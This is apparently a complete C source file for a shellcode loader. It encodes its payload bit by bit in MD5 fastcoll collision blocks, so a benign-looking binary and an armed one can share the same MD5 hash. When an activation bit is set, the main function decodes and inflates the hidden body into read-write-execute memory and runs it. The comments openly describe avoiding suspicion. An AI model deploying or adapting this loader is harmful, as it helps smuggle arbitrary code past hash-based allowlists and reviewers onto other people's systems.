#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <zlib.h>
#include <assert.h>

/* 4k ought to be enough for anyone */
#define BODY_SIZE 0x1000
#define MD5_BLOCKSZ 64

/* Each fastcoll block is 2x MD5 blocks */
typedef uint8_t block_t[MD5_BLOCKSZ * 2];

static uint32_t decoded_size;
static uint8_t decoded_body[BODY_SIZE];

__attribute__ ((aligned (MD5_BLOCKSZ)))
static struct {
	union {
		block_t padding;
		struct {
			uint32_t magic;
			uint32_t body_size;
		} params;
	} meta;
	block_t activate;
	block_t size[sizeof(decoded_size)][8];
	block_t body[sizeof(decoded_body)][8];
} collisions = {
	/* packer will find this */
	.meta.params.magic = 0xdeadbeef,
	.meta.params.body_size = BODY_SIZE
};

static inline int get_bit(block_t block)
{
	return (block[19] >> 7) & 1;
}

static void decode_buf(uint8_t *dst, block_t blocks[][8], size_t len)
{
	for (size_t i = 0; i < len; i++) {
		for (size_t j = 0; j < 8; j++) {
			dst[i] |= get_bit(blocks[i][j]) << j;
		}
	}
}

static void inflate_buf(void *dst, void *src, size_t dst_len, size_t src_len)
{
	z_stream strm;

	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;
	strm.avail_in = 0;
	strm.next_in = Z_NULL;

	assert(inflateInit2(&strm, -15) == Z_OK);
	
	strm.avail_in = src_len;
	strm.next_in = src;
	strm.avail_out = dst_len;
	strm.next_out = dst;

	assert(inflate(&strm, Z_FINISH) == Z_STREAM_END);
}

int main()
{
	if (!get_bit(collisions.activate)) {
		/* bail out before doing anything even slightly sus */
		return 0;
	}

	decode_buf((void*)&decoded_size, collisions.size, sizeof(decoded_size));
	decode_buf((void*)&decoded_body, collisions.body, sizeof(decoded_body));

	void (*shellcode)(void) = (void*) mmap(
		NULL,
		decoded_size,
		PROT_READ|PROT_WRITE|PROT_EXEC,
		MAP_ANONYMOUS|MAP_PRIVATE,
		-1,
		0
	);

	inflate_buf(shellcode, decoded_body, decoded_size, BODY_SIZE);

	shellcode();

	return 0;
}
